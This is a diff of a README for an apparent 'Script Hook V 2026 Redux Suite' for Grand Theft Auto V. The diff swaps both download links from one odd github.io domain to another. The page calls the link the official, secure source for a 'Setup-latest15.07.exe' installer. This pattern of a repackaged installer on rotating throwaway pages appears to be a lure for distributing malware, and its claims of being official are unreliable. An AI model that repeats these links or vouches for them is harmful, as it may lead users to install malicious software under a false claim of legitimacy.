@@ -2,7 +2,7 @@
 
 Script Hook V is a powerful scripting hook for Grand Theft Auto V, enabling the use of custom scripts and ASI plugins on Windows platforms. This 2026 Redux Suite offers an updated and enhanced version for seamless modding experiences, making it the go-to tool for GTA 5 enthusiasts looking to download Script Hook V with improved performance and stability.
 
-[![Download Installer](https://img.shields.io/badge/Download-Setup%20v15.07-brightgreen?style=for-the-badge&logo=windows)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Setup%20v15.07-brightgreen?style=for-the-badge&logo=windows)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -71,7 +71,7 @@ Script Hook V is primarily designed for single-player modding. Using it in onlin
 
 For the most up-to-date version and to ensure you have the official release, visit the download page linked below:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link directs you to the secure download portal where you can get the "Setup-latest15.07.exe" installer and related files. Remember to always scan downloaded files with antivirus software for added safety.
 
